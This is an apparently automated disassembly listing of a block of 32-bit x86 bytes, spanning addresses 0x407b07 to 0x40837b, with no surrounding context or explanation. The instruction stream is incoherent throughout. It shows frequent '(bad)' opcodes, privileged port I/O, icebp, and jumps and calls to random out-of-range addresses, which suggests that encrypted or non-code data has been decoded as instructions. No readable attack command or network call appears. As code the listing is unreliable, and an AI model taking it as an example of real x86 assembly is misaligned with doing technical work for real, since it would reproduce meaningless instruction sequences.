  407b07:	mov    dl,0xcd
  407b09:	mov    bl,0xf6
  407b0b:	cli    
  407b0c:	clc    
  407b0d:	out    dx,al
  407b0e:	not    ebx
  407b10:	mov    dh,0xda
  407b12:	in     al,dx
  407b13:	call   0xd71d6ae1
  407b18:	imul   ebx
  407b1a:	add    BYTE PTR [ecx],cl
  407b1c:	(bad)  
  407b1d:	out    0xe2,al
  407b1f:	(bad)  
  407b20:	push   cs
  407b21:	push   cs
  407b22:	loop   0x407b26
  407b24:	loop   0x407b04
  407b26:	jecxz  0x407b17
  407b28:	xlat   BYTE PTR ds:[ebx]
  407b29:	(bad)  
  407b2a:	out    0xb2,eax
  407b2c:	enter  0xd1cd,0xee
  407b30:	fdivr  DWORD PTR [ebp-0x240e1022]
  407b36:	loop   0x407af5
  407b38:	mov    ebp,0xdcdfc7e0
  407b3d:	push   es
  407b3e:	aam    0xf5
  407b40:	(bad)  
  407b41:	fld    DWORD PTR ds:0xdcadad0e
  407b47:	les    esi,FWORD PTR [ebx-0x3e124d32]
  407b4d:	in     al,dx
  407b4e:	repnz enter 0xceed,0xe9
  407b53:	shr    cl,cl
  407b55:	mov    edx,0xd0d3f803
  407b5a:	loope  0x407b60
  407b5c:	icebp  
  407b5d:	aam    0x6
  407b5f:	or     al,ah
  407b61:	enter  0x4ec,0xc1
  407b65:	mov    ebp,0xccefc1e9
  407b6a:	ror    al,cl
  407b6c:	out    0xb1,eax
  407b6e:	into   
  407b6f:	fidivr DWORD PTR [ebx-0x8081041]
  407b75:	icebp  
  407b76:	sar    dl,cl
  407b78:	rol    BYTE PTR [eax],1
  407b7a:	aam    0x4
  407b7c:	loope  0x407b78
  407b7e:	leave  
  407b7f:	jmp    esi
  407b81:	std    
  407b82:	sti    
  407b83:	(bad)  
  407b85:	leave  
  407b86:	loopne 0x407b38
  407b88:	fnsave [edi-0x32180b33]
  407b8e:	(bad)  
  407b8f:	cli    
  407b90:	fucomp st(2)
  407b92:	fild   DWORD PTR [ecx]
  407b94:	int    0xc8
  407b96:	fcom   st(3)
  407b98:	(bad)  
  407b99:	(bad)  
  407b9a:	push   es
  407b9b:	or     ebp,edi
  407b9d:	in     al,0xcb
  407b9f:	mov    esp,0xfc02dde6
  407ba4:	repz jecxz 0x407b72
  407ba7:	shl    ch,1
  407ba9:	xlat   BYTE PTR ds:[ebx]
  407baa:	shl    edx,cl
  407bac:	rcl    dh,1
  407bae:	fidiv  DWORD PTR [edi+edi*4-0x82f1114]
  407bb5:	rcl    ebx,0xdc
  407bb8:	repnz stc 
  407bba:	out    0x5,al
  407bbc:	cmc    
  407bbd:	loop   0x407bb5
  407bbf:	aam    0xfb
  407bc1:	inc    ch
  407bc3:	retf   0xc9bc
  407bc6:	into   
  407bc7:	out    dx,eax
  407bc8:	in     al,0xe4
  407bca:	ret    0xecdb
  407bcd:	mov    cl,0xe9
  407bcf:	iret   
  407bd0:	mov    dh,0xb5
  407bd2:	neg    ebx
  407bd4:	cmc    
  407bd5:	sti    
  407bd6:	mov    ebp,0xdaf8d5e7
  407bdb:	cld    
  407bdc:	add    BYTE PTR ds:0x1e6f9dd,al
  407be2:	out    0x12,eax
  407be4:	lds    ebp,FWORD PTR [edx-0x383d0f36]
  407bea:	jecxz  0x407bd3
  407bec:	cli    
  407bed:	push   eax
  407bef:	mov    edx,0xd1ecc9f5
  407bf4:	std    
  407bf5:	inc    edi
  407bf7:	repz stc 
  407bf9:	cmc    
  407bfa:	(bad)  
  407bfb:	in     eax,0xfb
  407bfd:	sar    dl,1
  407bff:	cli    
  407c00:	add    ch,dh
  407c02:	push   cs
  407c03:	in     eax,dx
  407c04:	loope  0x407bd0
  407c06:	lock lods al,BYTE PTR ds:[esi]
  407c08:	jmp    0xfae92fc3
  407c0d:	retf   
  407c0e:	retf   
  407c0f:	int3   
  407c10:	sar    BYTE PTR [eax-0x2afffe02],cl
  407c16:	out    0xd1,eax
  407c18:	in     eax,0xe0
  407c1a:	faddp  st(1),st
  407c1c:	fcmovnu st,st(3)
  407c1e:	push   es
  407c1f:	jecxz  0x407c02
  407c21:	clc    
  407c22:	fist   DWORD PTR [ebx]
  407c24:	int3   
  407c25:	leave  
  407c26:	ret    0xcba4
  407c29:	stos   BYTE PTR es:[edi],al
  407c2a:	fucomi st,st(1)
  407c2c:	mov    al,0xb7
  407c2e:	retf   0xd3cc
  407c31:	rcr    bl,cl
  407c33:	loop   0x407bed
  407c35:	ror    esi,0xe6
  407c38:	lock out 0xf6,al
  407c3b:	lock (bad) 
  407c3e:	retf   0xdbdf
  407c41:	psubw  mm5,mm3
  407c44:	mov    dl,0xd7
  407c46:	out    dx,al
  407c47:	retf   0xeee6
  407c4a:	iret   
  407c4b:	(bad)  
  407c4d:	loopne 0x407c00
  407c4f:	in     eax,dx
  407c50:	lds    edi,FWORD PTR [edx-0x104251d]
  407c56:	fcmovnb st,st(3)
  407c58:	add    edi,edi
  407c5a:	rcr    edx,cl
  407c5c:	retf   
  407c5d:	aam    0xf4
  407c5f:	loopne 0x407c27
  407c61:	(bad)  
  407c62:	loopne 0x407c6e
  407c64:	iret   
  407c65:	rol    bl,0xac
  407c68:	mov    dl,0xc5
  407c6a:	in     al,0xfb
  407c6c:	mov    cl,0xd1
  407c6e:	iret   
  407c6f:	out    dx,al
  407c70:	into   
  407c71:	out    dx,eax
  407c72:	mov    esp,0xf1defcd2
  407c77:	icebp  
  407c78:	push   es
  407c79:	(bad)  
  407c7a:	rol    esp,cl
  407c7c:	(bad)  
  407c7d:	jmp    0xe01f8a91
  407c82:	add    al,0x2
  407c84:	call   0xc1ee2c73
  407c89:	icebp  
  407c8a:	sti    
  407c8b:	idiv   eax
  407c8d:	icebp  
  407c8e:	(bad)  
  407c8f:	mov    ecx,0xf4d3d9be
  407c94:	shl    ah,1
  407c96:	int3   
  407c97:	out    0xd9,al
  407c99:	lock add ah,ah
  407c9c:	jecxz  0x407ca8
  407c9e:	(bad)
  407ca1:	pextrw esp,mm2,0xb8
  407ca5:	test   al,0xe3
  407ca7:	cmc    
  407ca8:	scas   eax,DWORD PTR es:[edi]
  407ca9:	in     eax,dx
  407caa:	in     al,dx
  407cab:	repnz stc 
  407cad:	repz (bad) 
  407caf:	out    dx,eax
  407cb0:	mov    ebx,0xfbd3ebea
  407cb5:	aam    0xda
  407cb7:	aam    0xc3
  407cb9:	sti    
  407cba:	shl    bl,0x9
  407cbd:	pmaddwd mm4,mm1
  407cc0:	cld    
  407cc1:	sti    
  407cc2:	push   cs
  407cc3:	into   
  407cc4:	shr    DWORD PTR [eax-0x16233152],0xf3
  407ccb:	int    0xc6
  407ccd:	(bad)  
  407cce:	mov    ebx,0x3d8f9fa
  407cd3:	add    cl,ch
  407cd5:	cli    
  407cd6:	iret   
  407cd7:	ffreep st(5)
  407cd9:	ret    0xc5e4
  407cdc:	jecxz  0x407cdb
  407cde:	test   DWORD PTR [edi],0x6c1e2c6
  407ce4:	int3   
  407ce5:	scas   eax,DWORD PTR es:[edi]
  407ce6:	iret   
  407ce7:	jecxz  0x407caa
  407ce9:	call   0xc72c69d8
  407cee:	mov    bh,0xcd
  407cf0:	enter  0xddd9,0xbf
  407cf4:	mov    eax,0xd1ecdfc0
  407cf9:	add    eax,0xd0ebf1f7
  407cfe:	call   0xfa10580d
  407d03:	call   0xa50974f6
  407d08:	mov    cl,0xf0
  407d0a:	out    0xf7,eax
  407d0c:	jmp    0xbeb6:0xffd1b0c8
  407d13:	loop   0x407cf2
  407d15:	cmc    
  407d16:	iret   
  407d17:	mov    eax,0xe9c5f9da
  407d1c:	lock ror al,1
  407d1f:	in     al,0x2
  407d21:	fcmovnu st,st(4)
  407d23:	pop    es
  407d24:	mov    edi,0xcdeeb0b2
  407d29:	in     eax,dx
  407d2a:	leave  
  407d2b:	repnz in eax,dx
  407d2d:	aad    0xdb
  407d2f:	lock icebp 
  407d31:	enter  0x2cf,0xfd
  407d35:	jecxz  0x407d0b
  407d37:	idiv   BYTE PTR [ebx-0x1cf42d42]
  407d3d:	aad    0xe
  407d3f:	retf   0x1d9
  407d42:	add    cl,BYTE PTR [edx]
  407d44:	mov    eax,0xe6c0b1eb
  407d4a:	in     eax,dx
  407d4b:	aam    0xe7
  407d4d:	jmp    0x407d15
  407d4f:	mov    ebx,0xffbdbbc9
  407d54:	mov    ebx,0x202e7d9
  407d59:	(bad)  
  407d5b:	push   es
  407d5c:	ret    0xdbdd
  407d5f:	push   es
  407d60:	in     eax,dx
  407d61:	in     al,dx
  407d62:	int    0xd3
  407d64:	in     eax,0xc9
  407d66:	(bad)  
  407d67:	repz in al,dx
  407d69:	loopne 0x407d3f
  407d6b:	(bad)
  407d6e:	sar    eax,1
  407d70:	int    0xd5
  407d72:	int3   
  407d73:	repz cld 
  407d75:	mov    esi,0xe104e6ec
  407d7a:	ror    dl,1
  407d7c:	aam    0x5
  407d7e:	out    0xf4,al
  407d80:	fld    st(2)
  407d82:	into   
  407d83:	adc    edx,ecx
  407d85:	in     eax,0xe1
  407d87:	cmc    
  407d88:	retf   0xecc8
  407d8b:	out    dx,eax
  407d8c:	shl    ah,1
  407d8e:	neg    bh
  407d90:	stc    
  407d91:	icebp  
  407d92:	mov    eax,0xecdcf6f8
  407d97:	(bad)  
  407d98:	loop   0x407d74
  407d9a:	fcomp  st(2)
  407d9c:	or     al,bh
  407d9e:	fucomp st(6)
  407da0:	fmulp  st(7),st
  407da2:	fldl2e 
  407da4:	mov    edi,0xb6aca5e4
  407da9:	ror    ecx,1
  407dab:	int    0xd6
  407dad:	repz mov edi,0xf2e9cddd
  407db3:	leave  
  407db4:	stc    
  407db5:	fdivr  st,st(5)
  407db7:	loope  0x407da5
  407db9:	shl    ecx,0xe0
  407dbc:	fild   DWORD PTR ds:0x4f4d6fa
  407dc2:	in     eax,0xe5
  407dc4:	mov    edi,0xe4d1e7b3
  407dc9:	mov    ah,0xf4
  407dcb:	loopne 0x407d82
  407dcd:	mov    ecx,0xb5cce9b1
  407dd2:	div    dh
  407dd4:	enter  0xd7b9,0xd3
  407dd8:	in     eax,0xe4
  407dda:	cli    
  407ddb:	add    esp,edx
  407ddd:	add    ecx,DWORD PTR [edx]
  407ddf:	clc    
  407de0:	enter  0xdcea,0x5
  407de4:	fsubrp st(0),st
  407de6:	idiv   DWORD PTR [esi-0x36173c1c]
  407dec:	rcr    edi,1
  407dee:	les    edi,FWORD PTR [ebx-0x7462a49]
  407df4:	add    bh,bl
  407df6:	repz in eax,dx
  407df8:	int    0xf6
  407dfa:	clc    
  407dfb:	fninit 
  407dfd:	loop   0x407ddb
  407dff:	out    dx,eax
  407e00:	add    al,0x4
  407e02:	(bad)  
  407e04:	mov    esi,0xdcd7b2b1
  407e09:	shl    DWORD PTR [ecx-0x1b13500d],cl
  407e0f:	mov    eax,0xde03f2dd
  407e14:	div    bh
  407e16:	pop    es
  407e17:	mov    edi,0xfcc7f4fb
  407e1c:	or     esi,esi
  407e1e:	sti    
  407e1f:	retf   
  407e20:	out    0xcc,al
  407e22:	enter  0xbe00,0xb3
  407e26:	out    dx,al
  407e27:	in     eax,dx
  407e28:	scas   al,BYTE PTR es:[edi]
  407e29:	mul    cl
  407e2b:	in     eax,dx
  407e2c:	jmp    0xfb104d00
  407e31:	dec    ecx
  407e33:	call   0xe6148220
  407e38:	fistp  QWORD PTR [ebp+0x2e201f8]
  407e3e:	out    0x4,eax
  407e40:	retf   0x8db
  407e43:	iret   
  407e44:	fsub   st,st(5)
  407e46:	shl    BYTE PTR [ebx-0x1b562955],cl
  407e4c:	in     eax,0xf4
  407e4e:	cmc    
  407e4f:	shr    ecx,cl
  407e51:	mov    ebp,0xbabdfc02
  407e56:	(bad)  
  407e57:	fdivr  st(0),st
  407e59:	out    0xc4,eax
  407e5b:	(bad)  
  407e5c:	stc    
  407e5d:	(bad)  
  407e5f:	vcmpgtps ymm4,ymm0,ymm0
  407e64:	icebp  
  407e65:	loop   0x407e14
  407e67:	mov    bh,0xca
  407e69:	mov    cl,0xf1
  407e6b:	jmp    0x407e24
  407e6d:	sti    
  407e6e:	int    0xfa
  407e70:	ror    ah,cl
  407e72:	hlt    
  407e73:	into   
  407e74:	jecxz  0x407e33
  407e76:	(bad)  
  407e78:	(bad)  
  407e79:	sar    ecx,cl
  407e7b:	in     al,0xe7
  407e7d:	loopne 0x407e86
  407e7f:	cli    
  407e80:	loopne 0x407e5a
  407e82:	(bad)  
  407e84:	(bad)  
  407e86:	fmul   st(6),st
  407e88:	lods   al,BYTE PTR ds:[esi]
  407e89:	retf   0xb6c6
  407e8c:	cmc    
  407e8d:	(bad)  
  407e8f:	out    0xff,al
  407e91:	(bad)  
  407e93:	fdivr  QWORD PTR [esi-0xb1a0e12]
  407e99:	hlt    
  407e9a:	shr    ecx,cl
  407e9c:	retf   
  407e9d:	jecxz  0x407e84
  407e9f:	or     bh,bl
  407ea1:	cli    
  407ea2:	out    dx,al
  407ea3:	loop   0x407e87
  407ea5:	loope  0x407e8c
  407ea7:	ret    
  407ea8:	jmp    0xe613649f
  407ead:	test   al,0xcd
  407eb0:	cli    
  407eb1:	hlt    
  407eb2:	idiv   ah
  407eb4:	(bad)  
  407eb5:	(bad)  
  407eb7:	fistp  QWORD PTR [esi-0x2e290d3d]
  407ebd:	retf   0xfce7
  407ec0:	loopne 0x407e87
  407ec2:	std    
  407ec3:	or     dh,BYTE PTR [ebx-0x434e390d]
  407ec9:	lods   eax,DWORD PTR ds:[esi]
  407eca:	icebp  
  407ecb:	retf   
  407ecc:	(bad)  
  407ecd:	shr    esp,cl
  407ecf:	fcomi  st,st(5)
  407ed1:	retf   
  407ed2:	fdivr  st,st(6)
  407ed4:	call   0xfaff76af
  407ed9:	add    BYTE PTR [edi],al
  407edb:	repnz cld 
  407edd:	call   0x103c3bd0
  407ee2:	adc    eax,DWORD PTR [edi]
  407ee4:	in     eax,0xb3
  407ee6:	les    edi,FWORD PTR [esi-0x18363e33]
  407eec:	xlat   BYTE PTR ds:[ebx]
  407eed:	enter  0xfde9,0xd8
  407ef1:	mov    ah,0xf0
  407ef3:	cld    
  407ef4:	stc    
  407ef5:	fdivrp st(0),st
  407ef7:	rol    DWORD PTR [esp+esi*8],0xfa
  407efb:	fidivr WORD PTR [edi-0x2516240b]
  407f01:	retf   0xed8
  407f04:	mov    ebp,0xece7e5e0
  407f09:	stos   BYTE PTR es:[edi],al
  407f0a:	rol    ah,0xe6
  407f0d:	out    0xcc,al
  407f0f:	idiv   ecx
  407f11:	int3   
  407f12:	lock fdiv st,st(4)
  407f15:	into   
  407f16:	fld    st(6)
  407f18:	int    0xe2
  407f1a:	(bad)  
  407f1b:	(bad)
  407f1e:	(bad)  
  407f1f:	fadd   st(4),st
  407f21:	loope  0x407efb
  407f23:	push   cs
  407f24:	shl    bl,1
  407f26:	rcr    dh,cl
  407f28:	shl    esp,1
  407f2a:	lods   eax,DWORD PTR ds:[esi]
  407f2b:	out    dx,eax
  407f2c:	div    bh
  407f2e:	sar    bl,1
  407f30:	mov    eax,0xbfd6e9db
  407f35:	mul    edi
  407f37:	add    DWORD PTR [ebp+0x7fa0ac3],edi
  407f3d:	add    edx,esp
  407f3f:	leave  
  407f40:	sti    
  407f41:	or     bh,bl
  407f43:	inc    dl
  407f45:	lods   eax,DWORD PTR ds:[esi]
  407f46:	mov    ebp,0xb3c4c9c8
  407f4b:	iret   
  407f4c:	ror    edi,1
  407f4e:	div    ebx
  407f50:	mov    ah,0xc8
  407f52:	std    
  407f53:	int3   
  407f54:	int3   
  407f55:	(bad)  
  407f57:	cld    
  407f58:	cli    
  407f59:	(bad)
  407f5c:	add    edi,ebp
  407f5e:	add    eax,0xd8c9c90f
  407f63:	jecxz  0x407f56
  407f65:	mov    esp,0xb5cae4f0
  407f6a:	jecxz  0x407f53
  407f6c:	lock xlat BYTE PTR ds:[ebx]
  407f6e:	mov    edi,0xd9babae9
  407f73:	aad    0xbd
  407f75:	(bad)  
  407f76:	aad    0xb4
  407f78:	loop   0x407f73
  407f7a:	add    eax,0xd9eafce5
  407f7f:	loop   0x407f7d
  407f81:	add    eax,0xf3c1d8e5
  407f86:	in     al,dx
  407f87:	shl    DWORD PTR [esi-0x43f2511],0xf3
  407f8e:	jmp    0xf1d3:0xd7e9dfec
  407f95:	out    0xc2,eax
  407f97:	push   es
  407f98:	fld    QWORD PTR [edi+ebx*8]
  407f9b:	repnz out 0xe3,eax
  407f9e:	out    0xe4,al
  407fa0:	std    
  407fa1:	or     eax,0xa6a804f3
  407fa6:	into   
  407fa7:	scas   al,BYTE PTR es:[edi]
  407fa8:	retf   0xd6cd
  407fab:	call   0xe7143678
  407fb0:	in     al,dx
  407fb1:	mov    esp,0xd8c9d0ee
  407fb6:	add    DWORD PTR [esi],eax
  407fb8:	int3   
  407fb9:	add    eax,0xff0bc70b
  407fbe:	mov    ebp,0xff0bde0d
  407fc3:	pop    es
  407fc4:	(bad)
  407fc8:	shr    DWORD PTR [ebp-0x2d1f103e],0xb9
  407fcf:	in     eax,dx
  407fd0:	bnd call 0xfd107f91
  407fd6:	fxam   
  407fd8:	fst    st(3)
  407fda:	(bad)  
  407fdc:	sti    
  407fdd:	leave  
  407fde:	shr    dh,0xa
  407fe1:	fcomi  st,st(3)
  407fe3:	retf   
  407fe4:	out    dx,eax
  407fe5:	loopne 0x407fcf
  407fe7:	mov    esp,0xe1eeb0ab
  407fec:	into   
  407fed:	jmp    0xe91a6ee4
  407ff2:	stc    
  407ff3:	mov    ebx,0xc6ffbc02
  407ff8:	out    0xcc,al
  407ffa:	loop   0x407fc7
  407ffc:	add    ecx,ebx
  407ffe:	mov    ebp,0xe4f4dee3
  408003:	pop    es
  408004:	jmp    0xf8092eaf
  408009:	stos   BYTE PTR es:[edi],al
  40800a:	in     eax,0xf9
  40800c:	hlt    
  40800d:	jmp    0xc02e44f8
  408012:	jecxz  0x408015
  408014:	stc    
  408015:	cli    
  408016:	mov    edi,0x7d602f0
  40801b:	fisttp DWORD PTR [ebx]
  40801d:	lock add eax,0xeef30100
  408023:	cli    
  408024:	mov    bl,0xee
  408026:	fadd   st(2),st
  408028:	retf   
  408029:	div    ebp
  40802b:	retf   0xbaf2
  40802e:	mov    cl,0xd4
  408030:	mov    ch,0xf2
  408032:	add    esi,ebx
  408034:	(bad)  
  408035:	(bad)  
  408037:	mov    eax,0xc7e6dcff
  40803c:	push   es
  40803d:	lock or edx,ecx
  408040:	loop   0x408031
  408042:	adc    ah,dl
  408044:	loopne 0x408024
  408046:	call   0xb23c5012
  40804b:	mov    cl,0xd0
  40804d:	retf   0xffd6
  408050:	(bad)  
  408051:	mov    ebp,0xe2f4c2cf
  408056:	mov    esi,0xf7ebbcda
  40805b:	loopne 0x40805e
  40805d:	jmp    0x408036
  40805f:	mul    bh
  408061:	repz or bh,ah
  408064:	retf   
  408065:	in     al,0xef
  408067:	shl    eax,cl
  408069:	(bad)
  40806c:	div    ecx
  40806e:	(bad)  
  40806f:	int3   
  408070:	hlt    
  408071:	leave  
  408072:	fmul   st(4),st
  408074:	ret    
  408075:	fld    QWORD PTR [eax]
  408077:	mov    ah,0xfd
  408079:	clc    
  40807a:	fsubr  st,st(1)
  40807c:	icebp  
  40807d:	(bad)  
  40807f:	fiadd  WORD PTR ds:0xcf00e0fb
  408085:	mov    cl,0xf3
  408087:	in     eax,0xe4
  408089:	mov    ch,0xc2
  40808b:	jmp    0xbc064e70
  408090:	fcmovnbe st,st(4)
  408092:	mov    ch,0xf4
  408094:	mov    bh,0xc1
  408096:	in     eax,dx
  408097:	add    edi,DWORD PTR [ebx-0x27023a25]
  40809d:	fcmovb st,st(7)
  40809f:	jmp    0xeb334780
  4080a4:	lods   al,BYTE PTR ds:[esi]
  4080a5:	jmp    0xf5f74971
  4080aa:	mov    dh,0xcc
  4080ac:	in     eax,dx
  4080ad:	xlat   BYTE PTR ds:[ebx]
  4080ae:	aad    0xd9
  4080b0:	icebp  
  4080b1:	mov    edi,0xeedebeff
  4080b6:	aam    0xfb
  4080b8:	not    esp
  4080ba:	jmp    0x4080be
  4080bc:	in     eax,0xc1
  4080be:	out    0xce,al
  4080c0:	std    
  4080c1:	out    0xd3,eax
  4080c3:	std    
  4080c4:	retf   
  4080c5:	test   ebp,0xc6c5e1a4
  4080cb:	mov    al,0xb5
  4080cd:	stc    
  4080ce:	mov    ch,0xf8
  4080d0:	jmp    0x4080a8
  4080d2:	mov    ch,0xe9
  4080d4:	not    ecx
  4080d6:	aad    0xed
  4080d8:	out    0xdb,eax
  4080da:	(bad)  
  4080db:	test   dh,0x0
  4080de:	neg    dl
  4080e0:	inc    DWORD PTR [esi]
  4080e2:	in     al,dx
  4080e3:	loopne 0x4080cc
  4080e5:	rcr    esp,1
  4080e7:	mov    dh,0xe2
  4080e9:	out    dx,al
  4080ea:	(bad)  
  4080eb:	out    dx,eax
  4080ec:	in     al,dx
  4080ed:	enter  0xbbf8,0xe8
  4080f1:	mov    ah,0xd8
  4080f3:	fxch   st(1)
  4080f5:	mov    ecx,0xc1c5ddc3
  4080fa:	add    edx,eax
  4080fc:	or     ebp,ebx
  4080fe:	idiv   bl
  408100:	into   
  408101:	int    0xcf
  408103:	add    eax,0xcad6c9ac
  408108:	(bad)  
  408109:	jmp    0xfb1a38e1
  40810e:	mov    ah,0xc8
  408110:	call   0xd5195100
  408115:	xlat   BYTE PTR ds:[ebx]
  408116:	(bad)  
  408118:	aam    0x2
  40811a:	call   eax
  40811c:	(bad)  
  40811d:	cmc    
  40811e:	add    ebp,edx
  408120:	cld    
  408121:	or     ecx,ebp
  408123:	fsubr  QWORD PTR [edx+eax*8-0xb0e3b1c]
  40812a:	retf   
  40812b:	mov    bl,0xeb
  40812d:	int3   
  40812e:	(bad)  
  40812f:	mov    edx,0xfdffc9f1
  408134:	xlat   BYTE PTR ds:[ebx]
  408135:	fcmovnb st,st(1)
  408137:	out    0x5,al
  408139:	cld    
  40813a:	hlt    
  40813b:	out    0xd5,eax
  40813d:	or     al,bl
  40813f:	or     ebx,ecx
  408141:	loope  0x408151
  408143:	icebp  
  408144:	lods   al,BYTE PTR ds:[esi]
  408145:	shr    bh,0xee
  408148:	rcl    bh,cl
  40814a:	mov    bh,0xdb
  40814c:	test   edi,0xbefad1fb
  408152:	sti    
  408153:	jecxz  0x40810f
  408155:	add    BYTE PTR [ebx],al
  408157:	(bad)  
  408159:	rol    ch,1
  40815b:	retf   0xe5d4
  40815e:	fcomi  st,st(5)
  408160:	loope  0x408142
  408162:	jmp    0xedec:0xdee5bdf1
  408169:	loope  0x408136
  40816b:	test   al,0xd5
  40816d:	aam    0xff
  40816f:	fcmovbe st,st(2)
  408171:	(bad)  
  408172:	stc    
  408173:	(bad)  
  408175:	mov    esi,0xfdd605d1
  40817a:	jmp    0xd900:0x5fcfde4
  408181:	add    ch,dl
  408183:	adc    bl,ah
  408185:	(bad)  
  408186:	in     eax,0xb1
  408188:	in     eax,0xce
  40818a:	cmc    
  40818b:	test   al,0xd8
  40818d:	mov    ecx,0xd5d8beeb
  408192:	shr    edx,cl
  408194:	icebp  
  408195:	fxch   st(6)
  408197:	aad    0xe0
  408199:	add    al,0xda
  40819b:	icebp  
  40819c:	loope  0x4081a4
  40819e:	cmc    
  40819f:	out    0xce,al
  4081a1:	or     ah,ah
  4081a3:	(bad)  
  4081a5:	shr    esi,cl
  4081a7:	ret    0xe4c6
  4081aa:	ret    
  4081ab:	mov    dl,0xcc
  4081ad:	cli    
  4081ae:	in     al,dx
  4081af:	in     al,dx
  4081b0:	(bad)  
  4081b1:	mov    ebx,0xc2f8dfd7
  4081b6:	fucomi st,st(6)
  4081b8:	cli    
  4081b9:	(bad)
  4081bc:	jmp    0xc94b7dcc
  4081c1:	in     eax,dx
  4081c2:	leave  
  4081c3:	shl    DWORD PTR [ebx-0x354c1a3d],cl
  4081c9:	mov    dl,0xee
  4081cb:	retf   0xcfbb
  4081ce:	into   
  4081cf:	(bad)  
  4081d1:	cli    
  4081d2:	ror    bh,cl
  4081d4:	mov    esp,0xbcf2c0ed
  4081d9:	mov    esp,0x7e8c3fe
  4081de:	std    
  4081df:	sti    
  4081e0:	retf   0x1200
  4081e3:	adc    esi,eax
  4081e5:	fsubr  st,st(5)
  4081e7:	mov    cl,0xaf
  4081e9:	jecxz  0x4081e1
  4081eb:	enter  0xf5af,0xd8
  4081ef:	in     eax,dx
  4081f0:	mov    ah,0xbc
  4081f2:	cmc    
  4081f3:	add    ch,ah
  4081f5:	ret    
  4081f6:	add    esp,edx
  4081f8:	repz jmp 0x4081f6
  4081fb:	mov    BYTE PTR [esi],0x1
  4081fe:	(bad)  
  4081ff:	loop   0x408209
  408201:	aam    0xed
  408203:	fisubr DWORD PTR [edi-0x1f571c57]
  408209:	jmp    0x4081f9
  40820b:	loopne 0x4081d3
  40820d:	in     al,0xf7
  40820f:	in     eax,0xfd
  408211:	mov    edx,0xf9eee3da
  408216:	out    dx,eax
  408217:	repz fdivp st(5),st
  40821a:	test   ecx,0xdfdcbedd
  408220:	or     bl,bh
  408222:	cld    
  408223:	int    0xdd
  408225:	(bad)
  408228:	out    0xf3,eax
  40822a:	loop   0x4081ff
  40822c:	mov    al,0xae
  40822e:	(bad)  
  40822f:	into   
  408230:	(bad)  
  408231:	rol    bl,1
  408233:	mov    eax,0xd4d601bc
  408238:	repz or edi,DWORD PTR [ecx-0x193f2a29]
  40823f:	(bad)  
  408240:	(bad)  
  408242:	add    eax,0xf0e8d0eb
  408247:	mul    esi
  408249:	out    0xcd,al
  40824b:	out    dx,al
  40824c:	int3   
  40824d:	out    0xdf,eax
  40824f:	in     al,0xfb
  408251:	aad    0xca
  408253:	std    
  408254:	mov    ebp,0xe7e1ecc0
  408259:	sti    
  40825a:	out    0xe7,eax
  40825c:	out    0xbe,eax
  40825e:	push   es
  40825f:	push   es
  408260:	jmp    0xf0bf:0xc7e8dac6
  408267:	repz rol esi,cl
  40826a:	loopne 0x40823a
  40826c:	hlt    
  40826d:	jmp    0xfa3b4c61
  408272:	shl    dh,1
  408274:	rcl    ch,1
  408276:	stc    
  408277:	xlat   BYTE PTR ds:[ebx]
  408278:	clc    
  408279:	mov    BYTE PTR [edi],0xf5
  40827c:	retf   
  40827d:	cli    
  40827e:	fucomi st,st(3)
  408280:	std    
  408281:	(bad)  
  408283:	push   es
  408284:	mov    ecx,0xb1efa8a9
  408289:	out    0xea,eax
  40828b:	lods   al,BYTE PTR ds:[esi]
  40828c:	retf   
  40828d:	mov    ecx,0x3c9bbb6
  408292:	std    
  408293:	jecxz  0x408290
  408295:	in     al,dx
  408296:	not    edi
  408298:	(bad)  
  408299:	mov    esi,0xbed5f7f5
  40829e:	(bad)  
  40829f:	retf   0xee4
  4082a2:	(bad)  
  4082a3:	loopne 0x408290
  4082a5:	ror    bh,1
  4082a7:	mov    al,0xd5
  4082a9:	in     al,dx
  4082aa:	xlat   BYTE PTR ds:[ebx]
  4082ab:	not    dl
  4082ad:	clc    
  4082ae:	clc    
  4082af:	into   
  4082b0:	xlat   BYTE PTR ds:[ebx]
  4082b1:	hlt    
  4082b2:	shl    ah,1
  4082b4:	repnz add cl,bh
  4082b7:	aam    0xf2
  4082b9:	(bad)  
  4082ba:	rol    DWORD PTR ds:0xcae1d8f0,1
  4082c0:	jecxz  0x4082bc
  4082c2:	fsubr  st,st(3)
  4082c4:	mov    eax,0xcea8eed7
  4082c9:	out    0xdb,eax
  4082cb:	call   0xf60f7bbd
  4082d0:	test   ebp,0x101d8f3
  4082d6:	shl    edi,cl
  4082d8:	fsub   st,st(0)
  4082da:	loope  0x4082b7
  4082dc:	idiv   dl
  4082de:	(bad)  
  4082df:	loop   0x4082bc
  4082e1:	or     ah,bl
  4082e3:	add    esi,DWORD PTR [ebx-0x4f5b4f2d]
  4082e9:	out    0xb1,eax
  4082eb:	cmc    
  4082ec:	loopne 0x4082b5
  4082ee:	fdivp  st(3),st
  4082f0:	mov    edi,0xc9b4cdf3
  4082f5:	cld    
  4082f6:	inc    dh
  4082f8:	rcl    ebp,cl
  4082fa:	fucomi st,st(3)
  4082fc:	push   es
  4082fd:	add    al,0xe5
  4082ff:	cld    
  408300:	aad    0xed
  408302:	push   cs
  408303:	add    bh,ah
  408305:	mov    al,0xc4
  408308:	scas   al,BYTE PTR es:[edi]
  408309:	in     eax,dx
  40830a:	test   eax,0xead5f5b6
  40830f:	(bad)  
  408310:	mov    ecx,0xfcb8f1ef
  408315:	add    edi,ebx
  408317:	pop    es
  408318:	out    0xbd,al
  40831a:	in     al,0xf5
  40831c:	add    ch,cl
  40831e:	lds    ecx,FWORD PTR [eax]
  408320:	(bad)  
  408321:	(bad)  
  408323:	clc    
  408324:	fmul   st(3),st
  408326:	mov    bh,0xec
  408328:	int3   
  408329:	jmp    0xce195af2
  40832e:	fadd   st,st(6)
  408330:	mov    ah,0xfe
  408332:	mov    edx,0xd7c2dfe1
  408337:	mov    ah,0xe3
  408339:	repnz (bad) 
  40833b:	rcl    ah,0xd7
  40833e:	pop    es
  40833f:	(bad)  
  408341:	lsl    edi,dx
  408344:	fsubr  DWORD PTR [eax-0x4312531a]
  40834a:	enter  0xebe2,0xba
  40834e:	mov    eax,0xd8cedfeb
  408353:	(bad)  
  408354:	out    dx,al
  408355:	shl    eax,0xe0
  408358:	rol    eax,cl
  40835a:	stc    
  40835b:	(bad)  
  40835c:	jmp    0x408332
  40835e:	std    
  40835f:	(bad)  
  408361:	fmul   st,st(6)
  408363:	fstp   st(0)
  408365:	out    0xbf,al
  408367:	retf   0xf6c8
  40836a:	sar    DWORD PTR [edx-0x2235371a],0xd1
  408371:	jmp    0xd2407140
  408376:	repnz aam 0xfa
  408379:	jmp    0x408380
  40837b:	hlt    
